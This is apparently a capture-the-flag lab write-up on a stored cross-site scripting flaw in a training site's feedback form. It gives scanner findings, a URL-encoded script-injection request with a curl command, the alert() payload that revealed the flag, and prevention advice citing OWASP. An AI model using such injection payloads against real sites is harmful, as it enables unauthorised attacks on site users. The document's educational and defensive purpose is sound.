[README.md](../../../README.md)
# XSS injection feedback page
## Reconnaissance
### ZAP report
```
Risk=High, Confidence=Medium (3)
http://10.13.200.51 (3)
Cross Site Scripting (Persistent) (1)
GET http://10.13.200.51/?page=feedback
Cross Site Scripting (Reflected) (1)
POST http://10.13.200.51/?page=feedback
```

### Wapiti Report
```
XSS vulnerability found via injection in the parameter txtName
POST /?page=feedback HTTP/1.1
Host: 10.13.200.53
Referer: http://10.13.200.53/?page=feedback
Content-Type: application/x-www-form-urlencoded

txtName=%3CScRiPt%3Ealert%28%27wererd0tey%27%29%3C%2FsCrIpT%3E&btnSign=Sign+Guestbook&mtxtMessage=Hi+there%21
curl "http://10.13.200.53/?page=feedback" -e "http://10.13.200.53/?page=feedback" -d "txtName=%3CScRiPt%3Ealert%28%27wererd0tey%27%29%3C%2FsCrIpT%3E&btnSign=Sign+Guestbook&mtxtMessage=Hi+there%21"
```

## Exploit
The most stupid test was successful:
- In the message field input: `<script>alert(1);</script>`
- The flag just pop.

**Flag:**
```
THE FLAG IS : 0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E
```

## Prevention
- [Cross Site Scripting (XSS) | OWASP Foundation](https://owasp.org/www-community/attacks/xss/)
    - [Cross Site Scripting Prevention - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (4.13)](https://cwe.mitre.org/data/definitions/79.html)

XSS is a type of vulnerability where attackers inject malicious scripts into web pages.
Three main types of XSS vulnerabilities:
- **Reflected XSS**: Injected into the website's response.
- **Stored XSS**: Malicious script is stored on the server and then served to all the website users.
- **DOM-based XSS**: Occurs entirely on the user's browser rather than on the server. The payload is never sent to the server

In this case it would be a Stored XSS because the comment is stored and then served to all the users.

### How to prevent
- Modern web frameworks have fewer XSS bugs:
    - React Example: `dangerouslySetInnerHTML` should be explicitely used to be vulnerable
- Implement variable validation and/or sanitization
- Output encoding: variables should not be interpreted as code instead of text.
    - When you wish to display data as the user typed it in, start with your framework’s default output encoding protection.
- HTML Sanitization: will strip dangerous HTML from a variable and return a safe string.
    - [cure53/DOMPurify: DOMPurify - a DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML and SVG. DOMPurify works with a secure default, but offers a lot of configurability and hooks. Demo:](https://github.com/cure53/DOMPurify)